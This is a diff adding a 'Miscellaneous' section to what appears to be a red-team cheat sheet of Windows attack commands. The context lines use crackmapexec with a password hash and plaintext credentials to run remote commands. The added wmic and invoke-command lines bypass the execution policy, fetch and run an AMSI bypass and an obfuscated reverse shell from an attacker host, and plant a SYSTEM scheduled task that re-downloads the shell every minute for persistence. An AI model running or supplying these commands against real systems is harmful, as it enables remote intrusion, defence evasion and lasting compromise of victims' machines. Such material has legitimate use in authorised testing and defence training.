@@ -31,3 +31,12 @@ crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9c
 crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd --spider C\$ --pattern txt 
 crackmapexec smb 192.168.10.131 -u Administrator -p P@ssw0rd -x "type C:\Windows\System32\Tasks\HackMe.txt"
 ```
+
+### Miscellaneous
+```
+wmic /node:john.activebreach.io process call create "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ping 192.168.100.100”
+wmic /node:john.activebreach.io process call create "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.100:8080/amsibypass.txt')”
+wmic /node:john.activebreach.io process call create "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.100:8080/Obfuscated_RevShell.ps1')”
+invoke-command -computername john.activebreach.io -scriptblock {schtasks /create /SC minute /mo 1 /RU "NT Authority\SYSTEM" /TN "Persist" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.100:8080/Obfuscated_RevShell.ps1''')'"}
+
+```
